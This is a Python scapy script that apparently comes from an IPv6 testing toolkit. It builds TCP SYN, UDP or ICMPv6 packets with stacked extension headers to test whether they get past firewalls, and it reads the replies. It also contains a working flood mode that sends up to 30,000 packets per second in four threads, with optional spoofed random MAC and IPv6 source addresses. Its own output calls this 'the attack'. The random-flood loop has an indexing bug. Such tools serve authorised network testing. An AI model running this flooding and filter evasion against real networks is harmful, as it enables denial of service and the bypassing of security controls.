#!/usr/bin/env python3
import argparse
import logging
import multiprocessing
import random
import re
import sys
import threading
from collections import Counter

import netifaces
import netifaces as ni
import psutil
from scapy.arch import get_if_hwaddr
from scapy.layers.inet import TCP, UDP
from scapy.layers.inet6 import IPv6, IPv6ExtHdrDestOpt, Pad1, PadN, IPv6ExtHdrFragment, fragment6, IPv6ExtHdrHopByHop, \
    RouterAlert, IPv6ExtHdrRouting, ICMPv6EchoRequest, ICMPv6EchoReply, ICMPv6ParamProblem, ICMPv6DestUnreach, \
    ICMPv6TimeExceeded, ICMPv6PacketTooBig, ICMPv6ND_NA
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast, sniff
from scapy.volatile import RandShort, RandString, RandInt
from validate_parameters import is_valid_ipv6, payload, convert_paramProblem, convert_destUnrechable, \
    convert_timeExceeded, convert_tcpFlags, validate_file
from validate_parameters import is_valid_mac
from validate_parameters import is_valid_port

# Increase the recursion limit when calling Python objects (used when lots of Extension headers - > 300 headers)
sys.setrecursionlimit(10 ** 6)


def parameter():

    # Validate the format of Extension headers
    hdr_pattern = re.compile(r'(hbh|fra|des|rou):\d+')

    # Define the type function to be used for the -hdr argument
    def valid_hdr_format(hdr_string):
        if not hdr_pattern.match(hdr_string):
            raise argparse.ArgumentTypeError(
                f"---> Invalid format for -hdr argument. Valid formats: -hdr 'hbh:x' or -hdr 'fra:x' or -hdr "
                f"'des:x' or -hdr 'rou:x', where x is a positive integer!!!")
        return hdr_string

    parser = argparse.ArgumentParser(
        description="|> Sending TCP SYN, UDP or ICMPv6 message(s) with Extension Header to a target for checking "
                    "firewall bypass with arbitrary types of Extension Header. For example, To insert x Hop-by-Hop "
                    "Headers, type -hdr \"hbh:x\". To insert x Destination Headers, type -hdr \"des:x\". To insert x "
                    "Fragment Headers, type -hdr \"fra:x\". To insert x Routing Headers, type -hdr \"rou:x\". The "
                    "order of Extension Headers follows the the way of inserting parameters. For example, "
                    "-hdr \"rou:5\" \"des:5\" \"fra:5\" \"des:5\" \"hbh:5\". Option to flood "
                    "is also included.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender.")
    parser.add_argument("-type", dest="type", choices=["TCP", "UDP", "ICMPv6"], action="store", default="ICMPv6",
                        help="the type of packet to send (TCP, UDP, ICMPv6) (ICMPv6 if skipping).")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping).")
    parser.add_argument("-dmac", dest="destination_mac", action="store",
                        help="the MAC address of receiver (resolved from the interface if skipping).")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping).")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::1"
                                                                            " if skipping).")
    parser.add_argument("-sport", dest="source_port", action="store", type=int,
                        help="the port of sender (set to random port if skipping when choosing TCP or UDP).")
    parser.add_argument("-dport", dest="dest_port", action="store", type=int,
                        help="the port of destination (set to random port if skipping when choosing TCP or UDP).")
    parser.add_argument("-hdr", dest="extension_header", nargs="+", type=valid_hdr_format,
                        help="insert the extension header into the packet. Users can also define number of Extension "
                             "Headers and their order.")
    parser.add_argument("-l", dest="data_length", type=int, action="store",
                        help="the size of data in bytes (32 if skipping).")
    parser.add_argument("-i", dest="filename", action="store", type=validate_file,
                        help="input file to send (not influenced by parameter -l if being set).", metavar="FILE")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the targets with option: sending messages using only the defined "
                             "source addresses (constant), or sending messages with many random source "
                             "addresses (random).")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    flag = False

    # Validate the type of packet
    if args.type is None:
        args.type = "ICMPv6"

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][0]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            flag = True

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        print("---> No destination IPv6 address is inserted. Try again!!!")
        flag = True

    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            flag = True

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            flag = True

    # Validate the source port
    if args.source_port is None:
        args.source_port = RandShort()
    if args.source_port is not None:
        if not is_valid_port(args.source_port):
            print("---> The given source port is invalid. Try again!!!")
            flag = True

    # Validate the destination port
    if args.dest_port is None:
        args.dest_port = RandShort()
    if args.dest_port is not None:
        if not is_valid_port(args.dest_port):
            print("---> The given destination port is invalid. Try again!!!")
            flag = True

    # Validate the size of Payload data
    if args.data_length is None:
        args.data_length = 32
    if args.data_length is not None:
        if not is_valid_port(args.data_length):
            print("---> The given size of data is invalid. Try again!!!")
            flag = True
    if args.data_length is not None and args.filename is not None:
        print("---> Sending the data following the file, not related to the data length!!!")

    # Get the content of file
    if args.filename is not None:
        with open(args.filename, 'rb') as f:
            content = f.read()
            f.close()
    data = ''
    if args.filename is None:
        data = payload(args.data_length)
    if args.filename is not None:
        data = content

    if flag:
        sys.exit(1)
        
    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    return args.interface, args.type, args.source_mac, args.destination_mac, args.source_ip, args.destination_ip, args.source_port, args.dest_port, args.extension_header, data, args.flood


def generate(interface, type, source_mac, destination_mac, source_ip, destination_ip, source_port, dest_port, hdr, data, flood):
    # Validate the option of packet a general format of packet
    if destination_mac is None:
        layer2 = Ether(src=source_mac)
    if destination_mac is not None:
        layer2 = Ether(src=source_mac, dst=destination_mac)
    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=255)
    packet1 = layer2 / layer3

    if type == "TCP":
        layer4 = TCP(sport=source_port, dport=dest_port, seq=RandInt(), flags='S')
    if type == "UDP":
        layer4 = UDP(sport=source_port, dport=dest_port)

    for i in range(len(hdr)):
        if hdr[i][:3] == "hbh" and hdr[i][-1] != '0':
            hbh_hdr = IPv6ExtHdrHopByHop()
            for j in range(int(hdr[i][-1])-1):
                hbh_hdr /= IPv6ExtHdrHopByHop()
            packet1 /= hbh_hdr

        if hdr[i][:3] == "fra" and hdr[i][-1] != '0':
            fra_hdr = IPv6ExtHdrFragment(id=12345)
            for j in range(int(hdr[i][-1])-1):
                fra_hdr /= IPv6ExtHdrFragment(id=12345)
            packet1 /= fra_hdr

        if hdr[i][:3] == "des" and hdr[i][-1] != '0':
            des_hdr = IPv6ExtHdrDestOpt()
            for j in range(int(hdr[i][-1])-1):
                des_hdr /= IPv6ExtHdrDestOpt()
            packet1 /= des_hdr

        if hdr[i][:3] == "rou" and hdr[i][-1] != '0':
            rou_hdr = IPv6ExtHdrRouting()
            for j in range(int(hdr[i][-1])-1):
                rou_hdr /= IPv6ExtHdrRouting()
            packet1 /= rou_hdr

    if type == "ICMPv6":
        packet1 /= ICMPv6EchoRequest(id=RandShort(), seq=1, data=data)
    if type == "TCP" or type == "UDP":
        packet1 /= layer4 / data

    stats = psutil.net_if_stats()
    mtu = stats.get(interface).mtu
    if flood is None:
        print("Sending packet with Destination Option header to destination: " + destination_ip)
        if len(packet1) > mtu + 10:
            sendp(fragment6(packet1, mtu), verbose=False, iface=interface)
        else:
            sendp(packet1, verbose=False, iface=interface)
    if flood is not None:
        pkt_list = []
        print("Flooding the destination: " + destination_ip + "with Destination Option headers messages (press "
                                                              "Ctrl+C to stop the attack).....")
        if flood == "constant":
            if len(packet1) > mtu + 10:
                packet1 = fragment6(packet1, mtu)
            for i in range(50):
                pkt_list.append(packet1)

        if flood == "random":
            for i in range(40):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                M = 16 ** 4
                source_ip = "2001:dead:" + ":".join(("%x" % random.randint(0, M) for j in range(6)))
                layer2 = Ether(src=random_mac)
                layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=255)
                packet1 = layer2 / layer3

                if type == "TCP":
                    layer4 = TCP(sport=source_port, dport=dest_port, seq=RandInt(), flags='S')
                if type == "UDP":
                    layer4 = UDP(sport=source_port, dport=dest_port)

                for j in range(len(hdr)):
                    if hdr[i][:3] == "hbh" and hdr[i][-1] != '0':
                        hbh_hdr = IPv6ExtHdrHopByHop()
                        for k in range(int(hdr[i][-1]) - 1):
                            hbh_hdr /= IPv6ExtHdrHopByHop()
                        packet1 /= hbh_hdr

                    if hdr[i][:3] == "fra" and hdr[i][-1] != '0':
                        fra_hdr = IPv6ExtHdrFragment(id=12345)
                        for k in range(int(hdr[i][-1]) - 1):
                            fra_hdr /= IPv6ExtHdrFragment(id=12345)
                        packet1 /= fra_hdr

                    if hdr[i][:3] == "des" and hdr[i][-1] != '0':
                        des_hdr = IPv6ExtHdrDestOpt()
                        for k in range(int(hdr[i][-1]) - 1):
                            des_hdr /= IPv6ExtHdrDestOpt()
                        packet1 /= des_hdr

                    if hdr[i][:3] == "rou" and hdr[i][-1] != '0':
                        rou_hdr = IPv6ExtHdrRouting()
                        for k in range(int(hdr[i][-1]) - 1):
                            rou_hdr /= IPv6ExtHdrRouting()
                        packet1 /= rou_hdr

                if type == "ICMPv6":
                    packet1 /= ICMPv6EchoRequest(id=RandShort(), seq=1, data=data)
                if type == "TCP" or type == "UDP":
                    packet1 /= layer4 / data

                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


def sniffing(interface, source_ip, destination_ip):
    # Define our Custom Action function
    ip_list = []
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].src not in ip_list and ICMPv6ND_NA not in packet:
            key = tuple(sorted([source_ip, destination_ip]))
            packet_counts.update([key])
            if ICMPv6EchoReply in packet:
                print("===> Received Echo Reply of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                ip_list.append(packet[0][1].src)
            if ICMPv6ParamProblem in packet:
                print("===> Received Parameter Problem of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with error: " + convert_paramProblem(packet[ICMPv6ParamProblem].code))
                ip_list.append(packet[0][1].src)
            if ICMPv6DestUnreach in packet:
                print("===> Received Destination Unreachable of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with error: " + convert_destUnrechable(packet[ICMPv6DestUnreach].code))
                ip_list.append(packet[0][1].src)
            if ICMPv6TimeExceeded in packet:
                print("===> Received Time Exceeded of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with error: " + convert_timeExceeded(packet[ICMPv6TimeExceeded].code))
                ip_list.append(packet[0][1].src)
            if ICMPv6PacketTooBig in packet:
                print("===> Received Packet Too Big of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with informed MTU: " + str(packet[ICMPv6PacketTooBig].mtu))
                ip_list.append(packet[0][1].src)
            if TCP in packet:
                print("===> Received TCP message of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                flag_list = list(str(packet[TCP].flags))
                flag_message = "     with informed flag: " + "--".join(("%s" % convert_tcpFlags(flag_list[j]) for j in range(len(flag_list))))
                print(flag_message)
                ip_list.append(packet[0][1].src)
            else:
                pass

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6 dst %s" % source_ip

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=2)
        if len(ip_list) < 1:
            print("===> No response found.")
    except KeyboardInterrupt:
        sys.exit(0)


def execute_functions(interface, type, source_mac, destination_mac, source_ip, destination_ip, source_port, dest_port, hdr, data, flood):
    p1 = multiprocessing.Process(target=generate, args=[interface, type, source_mac, destination_mac, source_ip, destination_ip, source_port, dest_port, hdr, data, flood])
    p2 = multiprocessing.Process(target=sniffing, args=[interface, source_ip, destination_ip])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


if __name__ == "__main__":
    interface, type, source_mac, destination_mac, source_ip, destination_ip, source_port, dest_port, hdr, data, flood = parameter()

    if flood is None:
        try:
            execute_functions(interface, type, source_mac, destination_mac, source_ip, destination_ip, source_port, dest_port, hdr, data, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        try:
            generate(interface, type, source_mac, destination_mac, source_ip, destination_ip, source_port, dest_port, hdr, data, flood)
        except KeyboardInterrupt:
            # If KeyboardInterrupt is raised in the main thread, stop all child threads
            threading.Event().set()
            sys.exit(0)
